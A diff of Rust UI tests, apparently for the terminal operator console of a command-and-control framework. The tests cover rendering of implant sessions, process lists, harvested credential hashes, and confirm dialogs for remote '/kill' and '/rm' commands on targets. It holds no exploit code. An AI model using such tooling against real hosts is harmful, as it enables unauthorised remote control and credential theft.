+            .collect();
+        assert!(buf_str.contains("empty console"), "应显示空 console 引导");
+        assert!(buf_str.contains("command menu"), "引导应提到 / 菜单");
+        assert!(buf_str.contains("Ctrl+B"), "引导应提到 prefix 键位");
+        assert!(buf_str.contains("Ctrl+F"), "引导应提到搜索键位");
+    }
+
+    /// 默认布局右侧 sessions 窗格在无 agent 时提示等待上线（空状态引导）。
+    #[test]
+    fn empty_session_list_shows_waiting_hint() {
+        let mut app = fake_app();
+        let mut term = Terminal::new(TestBackend::new(80, 24)).unwrap();
+        term.draw(|f| render(&mut app, f)).unwrap();
+        let buf_str: String = term
+            .backend()
+            .buffer()
+            .content()
+            .iter()
+            .map(|c| c.symbol())
+            .collect();
+        assert!(
+            buf_str.contains("waiting for agents"),
+            "空 session 列表应提示等待 agent 上线"
+        );
+        // 默认布局：console 与 sessions 两个窗格 tab 都在。
+        assert!(buf_str.contains("console"), "应有 console 窗格 tab");
+        assert!(buf_str.contains("sessions"), "应有 sessions 窗格 tab");
+    }
+
     #[test]
     fn render_does_not_panic_empty() {
         let mut app = fake_app();
@@ -3146,7 +1501,7 @@ mod tests {
     #[test]
     fn render_does_not_panic_with_stream_and_popup() {
         let mut app = fake_app();
-        app.connected = true;
+        app.conn.connected = true;
         app.log("[a1b2c3] $ whoami", Level::Info);
         app.log("DEV\\alice", Level::Ok);
         app.log("! some error", Level::Err);
@@ -3163,7 +1518,7 @@ mod tests {
     #[test]
     fn render_does_not_panic_with_files_overlay() {
         let mut app = fake_app();
-        app.overlay = Overlay::Files(vec![
+        app.ovl.overlay = Overlay::Files(vec![
             FileEntry {
                 name: "notes.txt".into(),
                 size: 1234,
@@ -3185,7 +1540,7 @@ mod tests {
     fn render_does_not_panic_with_sessions_overlay() {
         use crate::types::SessionView;
         let mut app = fake_app();
-        app.sessions = vec![SessionView {
+        app.sess.list = vec![SessionView {
             id: "a1b2c3d4e5f6".into(),
             hostname: "host01".into(),
             username: "alice".into(),
@@ -3197,13 +1552,13 @@ mod tests {
             pid: 1234,
             ..Default::default()
         }];
-        if let Some(s) = app.sessions.first() {
-            app.pane_tree
-                .set_session_id(app.focused_pane, Some(s.id.clone()));
+        if let Some(s) = app.sess.list.first() {
+            app.panes.tree
+                .set_session_id(app.panes.focused, Some(s.id.clone()));
         }
         let mut st = ListState::default();
         st.select(Some(0));
-        app.overlay = Overlay::Sessions(st);
+        app.ovl.overlay = Overlay::Sessions(st);
         let mut term = Terminal::new(TestBackend::new(80, 24)).unwrap();
         term.draw(|f| render(&mut app, f)).unwrap();
     }
@@ -3216,7 +1571,7 @@ mod tests {
         use crossterm::event::{MouseButton, MouseEvent, MouseEventKind};
         let mut app = fake_app();
         // 两个 session，当前选第一个。
-        app.sessions = vec![
+        app.sess.list = vec![
             SessionView {
                 id: "aaaa1111aaaa".into(),
                 hostname: "hostA".into(),
@@ -3234,21 +1589,21 @@ mod tests {
                 ..Default::default()
             },
         ];
-        app.pane_tree
-            .set_session_id(app.focused_pane, Some("aaaa1111aaaa".into()));
+        app.panes.tree
+            .set_session_id(app.panes.focused, Some("aaaa1111aaaa".into()));
         let mut st = ListState::default();
         st.select(Some(0));
-        app.overlay = Overlay::Sessions(st);
+        app.ovl.overlay = Overlay::Sessions(st);
         // render 一帧，让 session_row_rects 被填充。
         let mut term = Terminal::new(TestBackend::new(80, 24)).unwrap();
         term.draw(|f| render(&mut app, f)).unwrap();
         // 确认 hit regions 至少 2 行。
         assert!(
-            app.session_row_rects.len() >= 2,
+            app.panes.overlay_rows.len() >= 2,
             "应记录至少 2 行 hit region"
         );
         // 点击第 2 行（hostB）的中间位置。
-        let (row2_rect, _) = app.session_row_rects[1];
+        let (row2_rect, _) = app.panes.overlay_rows[1];
         let click_col = row2_rect.x + 5;
         let click_row = row2_rect.y;
         app.handle_mouse(MouseEvent {
@@ -3258,14 +1613,14 @@ mod tests {
             modifiers: crossterm::event::KeyModifiers::empty(),
         });
         // 验证焦点窗格的 session 切到了 bbbb2222（hostB）。
-        let selected = app.pane_tree.get_session_id(app.focused_pane);
+        let selected = app.panes.tree.get_session_id(app.panes.focused);
         assert_eq!(
             selected.as_deref(),
             Some("bbbb2222bbbb"),
             "点击 hostB 行应切换到该 session，got {selected:?}"
         );
         // overlay 应关闭。
-        assert!(!app.overlay.is_open(), "点击后 overlay 应关闭");
+        assert!(!app.ovl.overlay.is_open(), "点击后 overlay 应关闭");
     }
 
     /// 点击窗格 SessionList 视图的行切换该窗格的 session（核心交互）。
@@ -3276,7 +1631,7 @@ mod tests {
         use crossterm::event::{MouseButton, MouseEvent, MouseEventKind};
         let mut app = fake_app();
         // 两个 session。
-        app.sessions = vec![
+        app.sess.list = vec![
             SessionView {
                 id: "aaaa1111aaaa".into(),
                 hostname: "hostA".into(),
@@ -3295,19 +1650,17 @@ mod tests {
             },
         ];
         // 焦点窗格设为 SessionList 视图，初始绑 hostA。
-        app.pane_tree = app
-            .pane_tree
+        app.panes.tree = app.panes.tree
             .clone()
-            .set_view(app.focused_pane, panes::PaneView::SessionList);
-        app.pane_tree
-            .set_session_id(app.focused_pane, Some("aaaa1111aaaa".into()));
+            .set_view(app.panes.focused, panes::PaneView::SessionList);
+        app.panes.tree
+            .set_session_id(app.panes.focused, Some("aaaa1111aaaa".into()));
         // render 一帧，让 pane_session_rows 被填充。
         let mut term = Terminal::new(TestBackend::new(80, 24)).unwrap();
         term.draw(|f| render(&mut app, f)).unwrap();
         // 确认 hit regions 有 2 行。
-        let rows = app
-            .pane_session_rows
-            .get(&app.focused_pane)
+        let rows = app.panes.list_rows
+            .get(&app.panes.focused)
             .expect("焦点窗格应有 session 行 hit regions");
         assert!(rows.len() >= 2, "应记录至少 2 行");
         // 点击第 2 行（hostB）。
@@ -3319,7 +1672,7 @@ mod tests {
             modifiers: crossterm::event::KeyModifiers::empty(),
         });
         // 验证焦点窗格切到 hostB。
-        let selected = app.pane_tree.get_session_id(app.focused_pane);
+        let selected = app.panes.tree.get_session_id(app.panes.focused);
         assert_eq!(
             selected.as_deref(),
             Some("bbbb2222bbbb"),
@@ -3333,7 +1686,7 @@ mod tests {
     fn sessionlist_current_row_has_highlight_background() {
         use crate::types::SessionView;
         let mut app = fake_app();
-        app.sessions = vec![
+        app.sess.list = vec![
             SessionView {
                 id: "aaaa1111aaaa".into(),
                 hostname: "hostA".into(),
@@ -3352,12 +1705,11 @@ mod tests {
             },
         ];
         // 焦点窗格 SessionList 视图，绑 hostA（第一行应高亮）。
-        app.pane_tree = app
-            .pane_tree
+        app.panes.tree = app.panes.tree
             .clone()
-            .set_view(app.focused_pane, panes::PaneView::SessionList);
-        app.pane_tree
-            .set_session_id(app.focused_pane, Some("aaaa1111aaaa".into()));
+            .set_view(app.panes.focused, panes::PaneView::SessionList);
+        app.panes.tree
+            .set_session_id(app.panes.focused, Some("aaaa1111aaaa".into()));
         let backend = TestBackend::new(80, 24);
         let mut term = Terminal::new(backend).unwrap();
         term.draw(|f| render(&mut app, f)).unwrap();
@@ -3396,7 +1748,7 @@ mod tests {
     fn age_for_returns_baseline_when_just_recorded() {
         // 客户端推算：刚记下的基线 (now, 100)，elapsed≈0 → age_for 仍为 100。
         let mut app = fake_app();
-        app.age_baseline
+        app.sess.age_baseline
             .insert("a1b2c3d4".into(), (Instant::now(), 100));
         assert_eq!(app.age_for("a1b2c3d4"), 100);
     }
@@ -3421,7 +1773,7 @@ mod tests {
         // /info 详情 overlay——覆盖 ja3/ja4/pid/pending/age + 本地 meta 的渲染路径。
         use crate::types::SessionView;
         let mut app = fake_app();
-        app.sessions = vec![SessionView {
+        app.sess.list = vec![SessionView {
             id: "a1b2c3d4e5f6".into(),
             hostname: "host01".into(),
             username: "alice".into(),
@@ -3435,9 +1787,9 @@ mod tests {
             ja4: Some("t13d0400_002b_c8dd0a8e8c9b".into()),
             ..Default::default()
         }];
-        app.age_baseline
+        app.sess.age_baseline
             .insert("a1b2c3d4e5f6".into(), (Instant::now(), 300));
-        app.overlay = Overlay::SessionDetail("a1b2c3d4e5f6".into());
+        app.ovl.overlay = Overlay::SessionDetail("a1b2c3d4e5f6".into());
         let mut term = Terminal::new(TestBackend::new(80, 24)).unwrap();
         term.draw(|f| render(&mut app, f)).unwrap();
     }
@@ -3446,7 +1798,7 @@ mod tests {
     fn render_does_not_panic_with_tasks_overlay() {
         // /tasks 排队任务 overlay。
         let mut app = fake_app();
-        app.overlay = Overlay::Tasks(vec![
+        app.ovl.overlay = Overlay::Tasks(vec![
             crate::rest::TaskRow {
                 task_id: 42,
                 command: serde_json::json!({"type": "shell", "args": "whoami"}),
@@ -3463,7 +1815,7 @@ mod tests {
     #[test]
     fn render_does_not_panic_with_procs_and_creds_overlay() {
         let mut app = fake_app();
-        app.overlay = Overlay::Procs(vec![ProcEntry {
+        app.ovl.overlay = Overlay::Procs(vec![ProcEntry {
             pid: 1,
             ppid: 0,
             name: "launchd".into(),
@@ -3472,7 +1824,7 @@ mod tests {
         let mut term = Terminal::new(TestBackend::new(80, 24)).unwrap();
         term.draw(|f| render(&mut app, f)).unwrap();
 
-        app.overlay = Overlay::Creds(vec![CredEntry {
+        app.ovl.overlay = Overlay::Creds(vec![CredEntry {
             source: "DEV".into(),
             principal: "alice".into(),
             kind: crate::types::CredKind::Hash,
@@ -3485,9 +1837,9 @@ mod tests {
     fn render_does_not_panic_with_split_panes() {
         // tmux 式分屏：Ctrl+% 后两个窗格，渲染不崩
         let mut app = fake_app();
-        let new_id = app.pane_tree.next_id(); // == 2
-        app.pane_tree = panes::Pane::single(1).split(1, panes::SplitDir::Columns, new_id);
-        app.focused_pane = new_id; // 新叶 id = 2
+        let new_id = app.panes.tree.next_id(); // == 2
+        app.panes.tree = panes::Pane::single(1).split(1, panes::SplitDir::Columns, new_id);
+        app.panes.focused = new_id; // 新叶 id = 2
         app.log("[a1b2c3] $ whoami", Level::Info);
         let mut term = Terminal::new(TestBackend::new(80, 24)).unwrap();
         term.draw(|f| render(&mut app, f)).unwrap();
@@ -3498,7 +1850,7 @@ mod tests {
         // 焦点窗格切换为 Files 视图，渲染不崩
         let mut app = fake_app();
         let nid1 = panes::Pane::single(1).next_id(); // == 2
-        app.pane_tree = panes::Pane::single(1)
+        app.panes.tree = panes::Pane::single(1)
             .split(1, panes::SplitDir::Rows, nid1)
             .set_view(nid1, panes::PaneView::SessionList);
         let mut term = Terminal::new(TestBackend::new(80, 24)).unwrap();
@@ -3514,7 +1866,7 @@ mod tests {
         term.draw(|f| render(&mut app, f)).unwrap();
         // 焦点窗格（id=1）应有 1 个 view tab hit region。
         assert!(
-            app.view_tab_rect.contains_key(&1),
+            app.panes.tab_rects.contains_key(&1),
             "焦点窗格应有 view tab hit region"
         );
         // buffer 应含当前视图名 + ▾。
@@ -3534,7 +1886,7 @@ mod tests {
     fn view_picker_renders_all_views_when_open() {
         let mut app = fake_app();
         // 手动打开 id=1 窗格的 picker。
-        app.view_picker = Some((1, ratatui::widgets::ListState::default()));
+        app.panes.picker = Some((1, ratatui::widgets::ListState::default()));
         let mut term = Terminal::new(TestBackend::new(120, 30)).unwrap();
         term.draw(|f| render(&mut app, f)).unwrap();
         let buf_str: String = term
@@ -3561,16 +1913,16 @@ mod tests {
     #[test]
     fn single_tab_survives_narrow_pane() {
         let mut app = fake_app();
-        let nid = app.pane_tree.next_id();
-        app.pane_tree =
-            app.pane_tree
+        let nid = app.panes.tree.next_id();
+        app.panes.tree =
+            app.panes.tree
                 .clone()
-                .split(app.focused_pane, panes::SplitDir::Columns, nid);
+                .split(app.panes.focused, panes::SplitDir::Columns, nid);
         // 窄终端，多分屏——单 tab 设计应不挤、不 panic。
         let mut term = Terminal::new(TestBackend::new(40, 20)).unwrap();
         term.draw(|f| render(&mut app, f)).unwrap();
         // 每个窗格都应有自己的 tab rect。
-        assert!(app.view_tab_rect.len() >= 2);
+        assert!(app.panes.tab_rects.len() >= 2);
     }
 
     /// 输入框渲染修复回归测试：prompt 内容（tag + ❯ + 输入）必须画在内容区
@@ -3616,10 +1968,10 @@ mod tests {
             content_row.contains("whoami"),
             "prompt 应画在内容行；content_row={content_row:?}"
         );
-        // 内容行还应含 ❯ 提示符和 [no beacon] 标签（fake_app 无 session）。
+        // 内容行还应含 ❯ 提示符和 [no session] 标签（fake_app 无 session）。
         assert!(content_row.contains("❯"), "内容行应有 ❯ 提示符");
         assert!(
-            content_row.contains("[no beacon]"),
+            content_row.contains("[no session]"),
             "内容行应有 session 标签"
         );
     }
@@ -3631,13 +1983,13 @@ mod tests {
         // with files_view populated and a pane set to PaneView::Files, the drawn
         // buffer contains the file name — proving the real data flows through.
         let mut app = fake_app();
-        app.files_view = vec![FileEntry {
+        app.sess.files_view = vec![FileEntry {
             name: "secret.txt".into(),
             size: 4096,
             is_dir: false,
             modified: "Jan 01".into(),
         }];
-        app.pane_tree = app.pane_tree.clone().set_view(1, panes::PaneView::Files);
+        app.panes.tree = app.panes.tree.clone().set_view(1, panes::PaneView::Files);
         let backend = TestBackend::new(80, 24);
         let mut term = Terminal::new(backend).unwrap();
         term.draw(|f| render(&mut app, f)).unwrap();
@@ -3657,7 +2009,7 @@ mod tests {
     fn files_pane_shows_placeholder_when_empty() {
         // Empty cache → the hint is still shown (operator is told how to populate).
         let mut app = fake_app();
-        app.pane_tree = app.pane_tree.clone().set_view(1, panes::PaneView::Files);
+        app.panes.tree = app.panes.tree.clone().set_view(1, panes::PaneView::Files);
         let backend = TestBackend::new(80, 24);
         let mut term = Terminal::new(backend).unwrap();
         term.draw(|f| render(&mut app, f)).unwrap();
@@ -3702,39 +2054,38 @@ mod tests {
             .unwrap();
         app.poll_worker();
         assert_eq!(
-            app.files_view.len(),
+            app.sess.files_view.len(),
             1,
             "files_view must mirror the parsed /ls result"
         );
-        assert_eq!(app.files_view[0].name, "cached.txt");
+        assert_eq!(app.sess.files_view[0].name, "cached.txt");
         assert!(
-            matches!(app.overlay, Overlay::Files(_)),
+            matches!(app.ovl.overlay, Overlay::Files(_)),
             "overlay path must still open as before"
         );
     }
 
     #[test]
     fn pane_split_close_focus_cycle() {
-        // 完整生命周期：split → close → 焦点回退
+        // 完整生命周期：默认双窗格 → split → close → 焦点回退
         let mut app = fake_app();
-        assert_eq!(app.pane_tree.leaf_count(), 1);
-        // split：当前最大 id=1，next_id()=2
-        let new_id = app.pane_tree.next_id(); // == 2
-        app.pane_tree =
-            app.pane_tree
+        assert_eq!(app.panes.tree.leaf_count(), 2, "默认布局为 console+sessions 双窗格");
+        // split：当前最大 id=2，next_id()=3
+        let new_id = app.panes.tree.next_id(); // == 3
+        app.panes.tree =
+            app.panes.tree
                 .clone()
-                .split(app.focused_pane, panes::SplitDir::Columns, new_id);
-        app.focused_pane = new_id;
-        assert_eq!(app.pane_tree.leaf_count(), 2);
+                .split(app.panes.focused, panes::SplitDir::Columns, new_id);
+        app.panes.focused = new_id;
+        assert_eq!(app.panes.tree.leaf_count(), 3);
         // close 新叶
-        app.pane_tree = app.pane_tree.clone().close(new_id);
-        app.focused_pane = app
-            .pane_tree
+        app.panes.tree = app.panes.tree.clone().close(new_id);
+        app.panes.focused = app.panes.tree
             .leaves()
             .first()
             .map(|(id, _)| *id)
             .unwrap_or(1);
-        assert_eq!(app.pane_tree.leaf_count(), 1);
+        assert_eq!(app.panes.tree.leaf_count(), 2);
     }
 
     #[test]
@@ -3742,7 +2093,7 @@ mod tests {
         let mut app = fake_app();
         // No snapshots sent; this must return immediately, not hang.
         app.poll_worker();
-        assert!(!app.connected);
+        assert!(!app.conn.connected);
         assert!(app.stream.is_empty());
     }
 
@@ -3772,15 +2123,19 @@ mod tests {
     #[test]
     fn overlay_does_not_cover_other_pane_in_split() {
         let mut app = fake_app();
+        // 显式重置为单窗格再二分：默认布局已是双窗格，本测的几何假设（左右各半）
+        // 基于从单叶 split 出两个 50/50 窗格。
+        app.panes.tree = panes::Pane::single(1);
+        app.panes.focused = 1;
         // 左右分屏：新叶 id=2 在左（x=0..40），原叶 id=1 在右（x=40..80）。
         // focused_pane 默认 = 1（原叶，右侧），所以 overlay 在右半。
-        let nid = app.pane_tree.next_id();
-        app.pane_tree =
-            app.pane_tree
+        let nid = app.panes.tree.next_id();
+        app.panes.tree =
+            app.panes.tree
                 .clone()
-                .split(app.focused_pane, panes::SplitDir::Columns, nid);
+                .split(app.panes.focused, panes::SplitDir::Columns, nid);
         // 确认焦点窗格在哪侧：layout 后查 focused_pane=1 的 rect。
-        app.overlay = Overlay::Files(vec![FileEntry {
+        app.ovl.overlay = Overlay::Files(vec![FileEntry {
             name: "ZZZ_OVERLAY_MARKER".into(),
             size: 1,
             is_dir: false,
@@ -3814,19 +2169,19 @@ mod tests {
     #[test]
     fn overlay_focused_pane_rect_is_pane_not_fullscreen() {
         let mut app = fake_app();
-        let nid = app.pane_tree.next_id();
-        app.pane_tree =
-            app.pane_tree
+        let nid = app.panes.tree.next_id();
+        app.panes.tree =
+            app.panes.tree
                 .clone()
-                .split(app.focused_pane, panes::SplitDir::Columns, nid);
-        app.overlay = Overlay::Files(vec![]);
+                .split(app.panes.focused, panes::SplitDir::Columns, nid);
+        app.ovl.overlay = Overlay::Files(vec![]);
         let mut term = Terminal::new(TestBackend::new(80, 24)).unwrap();
         term.draw(|f| render(&mut app, f)).unwrap();
         // 焦点窗格 rect 宽度应 < 80（不是全屏）。
         assert!(
-            app.focused_pane_rect.width < 80,
+            app.panes.focused_rect.width < 80,
             "focused_pane_rect 应是窗格大小非全屏，got width={}",
-            app.focused_pane_rect.width
+            app.panes.focused_rect.width
         );
     }
 
@@ -3834,9 +2189,9 @@ mod tests {
     #[test]
     fn render_confirm_overlay_shows_description_and_hints() {
         let mut app = fake_app();
-        app.confirm_action = Some(ConfirmAction {
+        app.ovl.confirm = Some(ConfirmAction {
             cmd: "/kill".into(),
-            description: "Kill beacon session deadbeef? The implant will exit.".into(),
+            description: "Kill session deadbeef? The implant will exit.".into(),
         });
         // 宽终端让描述不换行（避免 wrap 把子串拆到不同行导致线性扫描失败）。
         let mut term = Terminal::new(TestBackend::new(120, 30)).unwrap();
@@ -3849,7 +2204,7 @@ mod tests {
             .map(|c| c.symbol())
             .collect();
         assert!(buf_str.contains("Confirm"), "overlay 应有 Confirm 标题");
-        assert!(buf_str.contains("Kill beacon"), "overlay 应显示描述前半");
+        assert!(buf_str.contains("Kill session"), "overlay 应显示描述前半");
         assert!(buf_str.contains('y'), "overlay 应提示 y 键");
         assert!(buf_str.contains('n'), "overlay 应提示 n 键");
     }
@@ -3865,12 +2220,12 @@ mod tests {
             cmds: cmd_tx,
         });
         // 给一个 session 让 /kill 看起来有意义（不强制，但贴近真实路径）。
-        app.sessions = vec![SessionView {
+        app.sess.list = vec![SessionView {
             id: "deadbeef".into(),
             ..fake_session()
         }];
-        app.pane_tree
-            .set_session_id(app.focused_pane, Some("deadbeef".into()));
+        app.panes.tree
+            .set_session_id(app.panes.focused, Some("deadbeef".into()));
 
         // 模拟键入 /kill + Enter
         {
@@ -3881,7 +2236,7 @@ mod tests {
         app.submit();
 
         // 应进入确认态，未派发
-        assert!(app.confirm_action.is_some(), "/kill 应触发 confirm overlay");
+        assert!(app.ovl.confirm.is_some(), "/kill 应触发 confirm overlay");
         assert!(
             cmd_rx.try_recv().is_err(),
             "worker 不应在确认前收到任何 Cmd"
@@ -3898,12 +2253,12 @@ mod tests {
             snapshots: snap_rx,
             cmds: cmd_tx,
         });
-        app.sessions = vec![SessionView {
+        app.sess.list = vec![SessionView {
             id: "cafebabe".into(),
             ..fake_session()
         }];
-        app.pane_tree
-            .set_session_id(app.focused_pane, Some("cafebabe".into()));
+        app.panes.tree
+            .set_session_id(app.panes.focused, Some("cafebabe".into()));
 
         // 键入 /kill 回车 → 进确认态
         {
@@ -3912,11 +2267,11 @@ mod tests {
             st.cursor = 4;
         }
         app.submit();
-        assert!(app.confirm_action.is_some());
+        assert!(app.ovl.confirm.is_some());
 
         // --- 分支 A：按 n 取消 ---
         app.handle_key(KeyEvent::new(KeyCode::Char('n'), KeyModifiers::NONE));
-        assert!(app.confirm_action.is_none(), "n 应取消 confirm");
+        assert!(app.ovl.confirm.is_none(), "n 应取消 confirm");
         assert!(cmd_rx.try_recv().is_err(), "取消时不应派发");
 
         // 重新进确认态
@@ -3926,11 +2281,11 @@ mod tests {
             st.cursor = 4;
         }
         app.submit();
-        assert!(app.confirm_action.is_some());
+        assert!(app.ovl.confirm.is_some());
 
         // --- 分支 B：按 y 确认 → 派发 Cmd::Exit ---
         app.handle_key(KeyEvent::new(KeyCode::Char('y'), KeyModifiers::NONE));
-        assert!(app.confirm_action.is_none(), "y 后 confirm 应清空");
+        assert!(app.ovl.confirm.is_none(), "y 后 confirm 应清空");
         match cmd_rx.try_recv() {
             Ok(Cmd::Exit { session }) => {
                 assert_eq!(session, "cafebabe", "应向选中 session 派发 Exit");
@@ -3945,22 +2300,22 @@ mod tests {
     #[test]
     fn confirm_swallows_unrelated_keys() {
         let mut app = fake_app();
-        app.confirm_action = Some(ConfirmAction {
+        app.ovl.confirm = Some(ConfirmAction {
             cmd: "/rm /tmp/x".into(),
             description: "Delete file /tmp/x on the target?".into(),
         });
         // 一个不相关的字符键
         app.handle_key(KeyEvent::new(KeyCode::Char('a'), KeyModifiers::NONE));
         assert!(
-            app.confirm_action.is_some(),
+            app.ovl.confirm.is_some(),
             "无关键不应取消 confirm（必须显式 y/n/Esc）"
         );
         // Enter 也不应触发（不是 y/n/Esc）
         app.handle_key(KeyEvent::new(KeyCode::Enter, KeyModifiers::NONE));
-        assert!(app.confirm_action.is_some(), "Enter 在 confirm 态应被吞掉");
+        assert!(app.ovl.confirm.is_some(), "Enter 在 confirm 态应被吞掉");
         // Esc 应取消
         app.handle_key(KeyEvent::new(KeyCode::Esc, KeyModifiers::NONE));
-        assert!(app.confirm_action.is_none(), "Esc 应取消 confirm");
+        assert!(app.ovl.confirm.is_none(), "Esc 应取消 confirm");
     }
 
     /// 非破坏性命令不触发确认（直接派发）。
@@ -3972,12 +2327,12 @@ mod tests {
             snapshots: snap_rx,
             cmds: cmd_tx,
         });
-        app.sessions = vec![SessionView {
+        app.sess.list = vec![SessionView {
             id: "abc12345".into(),
             ..fake_session()
         }];
-        app.pane_tree
-            .set_session_id(app.focused_pane, Some("abc12345".into()));
+        app.panes.tree
+            .set_session_id(app.panes.focused, Some("abc12345".into()));
         {
             let st = app.focused_state_mut();
             st.input = "/getuid".into();
@@ -3985,7 +2340,7 @@ mod tests {
         }
         app.submit();
         assert!(
-            app.confirm_action.is_none(),
+            app.ovl.confirm.is_none(),
             "/getuid 非破坏性，不应进 confirm"
         );
         // 应直接派发
@@ -3999,14 +2354,14 @@ mod tests {
     #[test]
     fn overlay_scroll_resets_when_sessions_overlay_opens() {
         let mut app = fake_app();
-        app.sessions = vec![fake_session()];
+        app.sess.list = vec![fake_session()];
         // 预设一个非零滚动，模拟之前在别的 overlay 里滚过。
-        app.overlay_scroll = 42;
+        app.ovl.scroll = 42;
         // 走 /sessions 命令路径打开 overlay。
         app.run_meta("/sessions", "");
-        assert!(app.overlay.is_open(), "/sessions 应打开 overlay");
+        assert!(app.ovl.overlay.is_open(), "/sessions 应打开 overlay");
         assert_eq!(
-            app.overlay_scroll, 0,
+            app.ovl.scroll, 0,
             "overlay 打开时 overlay_scroll 必须复位为 0"
         );
     }
@@ -4024,17 +2379,17 @@ mod tests {
                 modified: "x".into(),
             })
             .collect();
-        app.overlay = Overlay::Files(rows);
-        app.overlay_scroll = 0;
+        app.ovl.overlay = Overlay::Files(rows);
+        app.ovl.scroll = 0;
         // 按 ↓：scroll 增加 1。
         app.handle_overlay_key(KeyEvent::new(KeyCode::Down, KeyModifiers::empty()));
-        assert_eq!(app.overlay_scroll, 1, "↓ 应让 overlay_scroll +1");
+        assert_eq!(app.ovl.scroll, 1, "↓ 应让 overlay_scroll +1");
         // 按 ↑：scroll 回到 0（saturating sub）。
         app.handle_overlay_key(KeyEvent::new(KeyCode::Up, KeyModifiers::empty()));
-        assert_eq!(app.overlay_scroll, 0, "↑ 应让 overlay_scroll 回 0");
+        assert_eq!(app.ovl.scroll, 0, "↑ 应让 overlay_scroll 回 0");
         // ↑ 再按不会下溢成 usize::MAX。
         app.handle_overlay_key(KeyEvent::new(KeyCode::Up, KeyModifiers::empty()));
-        assert_eq!(app.overlay_scroll, 0, "↑ 在 0 处不应下溢");
+        assert_eq!(app.ovl.scroll, 0, "↑ 在 0 处不应下溢");
     }
 
     /// PgUp/PgDn 在表格 overlay 里按页滚动（页大小 ≈ 焦点窗格可视高度）。
@@ -4049,29 +2404,29 @@ mod tests {
                 modified: "x".into(),
             })
             .collect();
-        app.overlay = Overlay::Files(rows);
+        app.ovl.overlay = Overlay::Files(rows);
         // 先 render 一帧，让 focused_pane_rect 被填充（页大小依赖它）。
         let mut term = Terminal::new(TestBackend::new(80, 24)).unwrap();
         term.draw(|f| render(&mut app, f)).unwrap();
-        app.overlay_scroll = 0;
+        app.ovl.scroll = 0;
         // overlay_scroll 顶部锚定：PgDn 向底加，PgUp 向顶减。
         app.handle_overlay_key(KeyEvent::new(KeyCode::PageDown, KeyModifiers::empty()));
         // 页大小 = focused_pane_rect.height - 4（最少 1），应 > 0。
-        let page = app.focused_pane_rect.height.saturating_sub(4).max(1) as usize;
+        let page = app.panes.focused_rect.height.saturating_sub(4).max(1) as usize;
         assert!(page > 0, "页大小应 > 0");
         assert_eq!(
-            app.overlay_scroll, page,
+            app.ovl.scroll, page,
             "PgDn 应按页大小（{page}）增加 overlay_scroll"
         );
         app.handle_overlay_key(KeyEvent::new(KeyCode::PageUp, KeyModifiers::empty()));
-        assert_eq!(app.overlay_scroll, 0, "PgUp 应减回 0");
+        assert_eq!(app.ovl.scroll, 0, "PgUp 应减回 0");
     }
 
     /// Sessions overlay 的 ↑/↓ 仍是选区导航（不碰 overlay_scroll），PgUp/PgDn 才滚动。
     #[test]
     fn sessions_overlay_arrows_navigate_selection_pguipdn_scrolls() {
         let mut app = fake_app();
-        app.sessions = vec![
+        app.sess.list = vec![
             SessionView {
                 id: "aaaa1111aaaa".into(),
                 ..fake_session()
@@ -4083,22 +2438,22 @@ mod tests {
         ];
         let mut st = ListState::default();
         st.select(Some(0));
-        app.overlay = Overlay::Sessions(st);
-        app.overlay_scroll = 5;
+        app.ovl.overlay = Overlay::Sessions(st);
+        app.ovl.scroll = 5;
         // ↓ → 选区下移（不是 overlay_scroll）。
         app.handle_overlay_key(KeyEvent::new(KeyCode::Down, KeyModifiers::empty()));
-        if let Overlay::Sessions(s) = &app.overlay {
+        if let Overlay::Sessions(s) = &app.ovl.overlay {
             assert_eq!(s.selected(), Some(1), "↓ 应移动选区到第 2 行");
         } else {
             panic!("overlay 仍是 Sessions");
         }
-        assert_eq!(app.overlay_scroll, 5, "↓ 不应改 overlay_scroll（选区导航）");
+        assert_eq!(app.ovl.scroll, 5, "↓ 不应改 overlay_scroll（选区导航）");
         // PgDn → overlay_scroll 增加（向底滚动列表）。
         app.handle_overlay_key(KeyEvent::new(KeyCode::PageDown, KeyModifiers::empty()));
         assert!(
-            app.overlay_scroll > 5,
+            app.ovl.scroll > 5,
             "PgDn 应增加 overlay_scroll（向底滚动），got {}",
-            app.overlay_scroll
+            app.ovl.scroll
         );
     }
 
@@ -4110,7 +2465,7 @@ mod tests {
         use crossterm::event::{MouseButton, MouseEvent, MouseEventKind};
         let mut app = fake_app();
         // 造 20 个 session，初始选第 0 个。
-        app.sessions = (0..20)
+        app.sess.list = (0..20)
             .map(|i| SessionView {
                 id: format!("{:012x}", i),
                 hostname: format!("h{i}"),
@@ -4119,14 +2474,14 @@ mod tests {
             .collect();
         let mut st = ListState::default();
         st.select(Some(0));
-        app.overlay = Overlay::Sessions(st);
+        app.ovl.overlay = Overlay::Sessions(st);
         let mut term = Terminal::new(TestBackend::new(80, 24)).unwrap();
         term.draw(|f| render(&mut app, f)).unwrap();
         // 滚动量设很大，让 render clamp 到 max_scroll（只显示尾部）。
-        app.overlay_scroll = 100;
+        app.ovl.scroll = 100;
         term.draw(|f| render(&mut app, f)).unwrap();
         // 首行的全局索引应 > 0（证明确实滚动了），且 < 20。
-        let (first_rect, first_idx) = app.session_row_rects[0];
+        let (first_rect, first_idx) = app.panes.overlay_rows[0];
         assert!(
             first_idx > 0,
             "滚动后首行全局索引应 > 0（确实滚动了），got {first_idx}"
@@ -4139,7 +2494,7 @@ mod tests {
             row: first_rect.y,
             modifiers: KeyModifiers::empty(),
         });
-        let selected = app.pane_tree.get_session_id(app.focused_pane);
+        let selected = app.panes.tree.get_session_id(app.panes.focused);
         let expected = format!("{:012x}", first_idx);
         assert_eq!(
             selected.as_deref(),
@@ -4154,30 +2509,30 @@ mod tests {
     #[test]
     fn ctrl_f_enters_search_input_mode() {
         let mut app = fake_app();
-        assert!(app.search_input.is_none());
+        assert!(app.ovl.search_input.is_none());
         app.handle_key(KeyEvent::new(KeyCode::Char('f'), KeyModifiers::CONTROL));
-        assert!(app.search_input.is_some(), "Ctrl+F 应进入搜索输入态");
+        assert!(app.ovl.search_input.is_some(), "Ctrl+F 应进入搜索输入态");
     }
 
     /// 搜索输入态下敲字符追加到 search_input；Esc 清空退出。
     #[test]
     fn search_input_typing_and_esc_clears() {
         let mut app = fake_app();
-        app.search_input = Some(String::new());
+        app.ovl.search_input = Some(String::new());
         app.handle_key(KeyEvent::new(KeyCode::Char('e'), KeyModifiers::empty()));
         app.handle_key(KeyEvent::new(KeyCode::Char('r'), KeyModifiers::empty()));
         app.handle_key(KeyEvent::new(KeyCode::Char('r'), KeyModifiers::empty()));
-        assert_eq!(app.search_input.as_deref(), Some("err"));
+        assert_eq!(app.ovl.search_input.as_deref(), Some("err"));
